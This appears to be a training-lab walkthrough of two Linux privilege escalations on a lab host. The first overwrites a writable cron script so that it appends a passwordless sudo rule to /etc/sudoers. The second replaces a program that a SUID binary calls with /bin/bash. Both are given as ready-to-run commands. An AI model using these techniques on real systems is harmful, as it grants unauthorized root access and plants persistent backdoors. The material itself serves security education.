#### Linux Privilege Escalation Through a Writable Cron Script

##### Check Target Connectivity

```
ping -c 4 target.ine.local
```

##### Access the Exposed Terminal

```
http://target.ine.local:8000
```

##### Check the Protected File

```
ls -l
```

##### Locate Files with the Same Name

```
find / -name message 2>/dev/null
```

Discovered copy:

```
/tmp/message
```

##### Identify the Copying Script

```
grep -nri "/tmp/message" /usr 2>/dev/null
```

Discovered script:

```
/usr/local/share/copy.sh
```

##### Inspect the Script

```
ls -l /usr/local/share/copy.sh
cat /usr/local/share/copy.sh
```

##### Replace the Writable Cron Script

```
printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers\n' > /usr/local/share/copy.sh
cat /usr/local/share/copy.sh
```

##### Verify Sudo Permissions

Wait for the cron job to execute, then run:

```
sudo -l
```

Expected permission:

```
student ALL=NOPASSWD:ALL
```

##### Switch to Root

```
sudo su
whoami
```


#### Linux Privilege Escalation Through a Vulnerable SUID Binary

##### Check Target Connectivity

```
ping -c 4 target.ine.local
```

##### Access the Exposed Terminal

```
http://target.ine.local:8000
```

##### Identify the SUID Binary

```
ls -l
file welcome
```

Detected binary:

```
welcome — SUID ELF executable
```

##### Analyze the Binary

```
strings welcome
```

Referenced executable:

```
greetings
```

##### Replace the Referenced Executable

```
rm greetings
cp /bin/bash greetings
```

##### Execute the SUID Binary

```
./welcome
```

##### Verify Root Access

```
whoami
id
```

